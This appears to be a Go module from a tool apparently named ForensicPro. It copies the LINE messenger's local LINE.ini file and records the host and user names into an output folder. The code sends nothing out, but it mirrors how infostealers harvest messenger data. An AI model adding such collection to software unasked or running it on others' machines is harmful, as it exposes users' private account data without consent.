package Messengers

import (
	"ForensicPro/utils"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
)

var messengerLineName = "Line"

func getSystemInfo() string {
	// 获取计算机名称
	hostname, err := os.Hostname()
	if err != nil {
		return "Error getting hostname: " + err.Error()
	}

	// 获取当前登录用户的用户名
	currentUser, err := user.Current()
	if err != nil {
		return "Error getting current user: " + err.Error()
	}

	// 构建字符串
	contents := "Computer Name = " + hostname + "\n" + "User Name = " + currentUser.Username

	return contents
}
func LineSave(path string) {

	LinePath := utils.GetLocalAppDataPath("LINE\\Data\\LINE.ini")
	if _, err := os.Stat(LinePath); err == nil {
		targetPath := filepath.Join(path, messengerLineName) // 请替换 "path" 和 "MessengerName" 为实际路径和名称
		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
			log.Fatalf("创建目录失败: %v", err)
		}

		Lineinidst := filepath.Join(targetPath, "Line.ini")
		utils.CopyFile(LinePath, Lineinidst)
		contents := getSystemInfo()
		outputFile := "infp.txt"
		if err := utils.WriteToFile(contents, targetPath+"\\"+outputFile); err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}
	}
	fmt.Println("Line ini saved successfully.")
}
